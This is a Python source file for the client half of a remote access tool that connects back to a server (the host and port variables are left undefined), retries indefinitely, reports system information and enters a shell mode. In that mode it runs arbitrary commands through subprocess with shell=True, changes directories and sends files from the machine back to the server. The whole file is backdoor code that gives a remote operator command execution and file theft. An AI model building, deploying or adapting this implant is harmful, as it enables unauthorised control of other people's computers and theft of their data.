#!/usr/bin/env python
# ---------- LIBRARIES ---------- #
# Global (System)
import time
import socket
import subprocess
import os
import shutil

from sys import *
from os import remove
import json
import platform
import pathlib
import base64

class CommandHandler():
    """
    Class to run commands from the user
    """
    def connectionCheck(self) -> str:
        """
        Checks whether there is a connection to the sys

        Returns:
            str: The Connection Response
        """
        return str.encode("connection working")

    def sysinfo(self) -> json:
        """
        Command to send the Server Sysinfo

        Returns:
            json: The Sysinfo in array decodable format
        """
        try:
            # Create Dict for the all data
            data = {}

            # Save all the Data to the Dict
            data['platform'] = platform.system()
            data['platform-release'] = platform.release()
            data['platform-version'] = platform.version()
            data['architecture'] = platform.machine()
            data['hostname'] = socket.gethostname()
            data['ip-address'] = socket.gethostbyname(socket.gethostname())
            data['processor'] = platform.processor()

            # Save dict to json and return to Client
            data = json.dumps(data)
            return data
        except:
            return 'Error Getting Sysinfo'

    def shell(self, command: str, conn: socket.socket):
        """
        Runs commands when server is in shell mode

        Args:
            command (str): The Command that the user sent
            conn (socket.socket): The socket connection to server
        """
        if command[:3] == 'cd ':
            try:
                # Change the directory and let user know the new directory
                os.chdir(command[3:])
                conn.send(str.encode(os.getcwd()))
            except:
                # Let user know that an error occurred
                conn.send(str.encode('Error Changing Directory'))
        elif command[:9] == 'filesize ':
            # Use os module to send the file size
            try:
                size = os.path.getsize(command[9:])
                conn.send(str.encode(f'The File Size is {size} bytes'))
            except:
                # If there is an error, let the user know
                conn.send(str.encode('Error Getting File Size'))
        elif command[:9] == 'download ':
            # Download files from user machine
            try:
                # Let the server know it is ready
                conn.send(str.encode('Ready'))
                
                # Get the buffSize
                buffSize = int(conn.recv(1024).decode())

                # Send the server the size of the file
                conn.send(str.encode(f'{os.path.getsize(command[9:])}'))

                # Open the file and send the data
                with open(command[9:], 'rb') as f:
                    data = f.read()
                    for i in range(len(data)//buffSize):
                        # Send the data for buffSize
                        conn.send(data[0:buffSize])

                        # Delete the data that is sent
                        data = data[buffSize:]
                        
                        # Wait for the server to acknowledge it was sent
                        conn.recv(1024)
                    
                    # Send any remaining data
                    conn.send(data)

            except IsADirectoryError:
                conn.send(str.encode('[-] Cannot Save a Directory'))
            except FileNotFoundError:
                conn.send(str.encode('[-] File Not Found'))
        else:
            # Execute any other command
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            if result.decode() != "":
                conn.send(result)
            else:
                # If there is no response, let the user know
                conn.send(str.encode("Done. No Output"))

class Client(CommandHandler):
    def __init__(self):
        """
        Connect to the server
        """
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sock.connect((host, port))
                # Start the Command Handler
                self.commandHandler()
                self.sock.close()
            except:
                continue

    def commandHandler(self):
        """
        Sends the commands to the proper location within the command handler
        """
        while True:
            data = self.sock.recv(1024)
            print(data)
            if data.decode() == 'connection check':
                self.sock.send(self.connectionCheck())
            elif data.decode() == 'sysinfo':
                data = self.sysinfo()
                self.sock.send(data.encode())
            elif data.decode() == 'shell':
                while True:
                    data = self.sock.recv(1024)
                    print(f"[Shell]: {data.decode()}")
                    if data.decode() == 'exit':
                        break
                    self.shell(data.decode(), self.sock)

def main():
    Client()

if __name__ == '__main__':
    main()